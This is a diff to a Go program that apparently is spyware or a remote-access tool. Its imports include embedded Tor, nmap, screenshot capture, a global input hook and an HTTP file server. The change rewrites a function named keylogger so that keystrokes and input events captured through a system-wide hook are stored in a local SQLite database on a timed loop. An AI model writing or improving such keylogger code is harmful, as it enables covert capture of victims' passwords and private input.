@@ -6,6 +6,7 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
+	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"encoding/pem"
@@ -32,6 +33,7 @@ import (
 	"github.com/clementauger/tor-prebuilt/embedded"
 
 	nmap "github.com/Ullaakut/nmap/v2"
+	fn "github.com/cauefcr/hierarchy/subsroutines"
 	"github.com/kbinani/screenshot"
 	hook "github.com/robotn/gohook"
 	"github.com/schollz/httpfileserver"
@@ -130,11 +132,23 @@ func deleteDataDirs() {
 }
 
 func keylogger(t *tor.Tor) {
-	EvChan := hook.Start()
-	defer hook.End()
+	if _, err := os.Stat("db.db"); os.IsNotExist(err) {
+		fmt.Println("Creating db.db...")
+		file, err := os.Create("db.db") // Create SQLite file
+		if err != nil {
+			panic(err)
+		}
+		file.Close()
+		fmt.Println("db.db created")
+	}
 
-	for ev := range EvChan {
-		fmt.Println("hook: ", ev)
+	db, _ := sql.Open("sqlite3", "./db.db") // Open the created SQLite File
+	defer db.Close()                        // Defer Closing the database
+	fn.CreateTable(db)                      // Create Database Tables
+	ev := hook.Start()
+	tick := time.Tick(1 * time.Minute)
+	for err := range fn.RunHook(ev, tick) {
+		log.Println(err)
 	}
 }
 
